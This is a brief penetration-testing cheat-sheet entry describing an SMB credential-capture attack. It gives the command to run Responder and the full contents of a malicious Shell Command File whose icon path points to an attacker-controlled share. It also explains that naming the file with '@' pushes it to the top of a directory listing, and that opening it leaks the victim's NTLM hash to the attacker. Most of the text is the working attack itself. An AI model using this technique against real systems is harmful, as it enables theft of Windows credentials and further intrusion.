# SMB

SCF (Shell Command Files)

```
Start responder: sudo responder -v -I interface

(Note: Filename starts with @ to bring file to top of directory listing)
Contents of @test.scf:

[Shell]
Command=2
IconFile=\\attacker\share\test.ico
[Taskbar]
Command=ToggleDesktop

Deliver file.

When user opens file, an SMB connection will be made to the attacker, which should be captured by responder, revealing an NTLM hash.
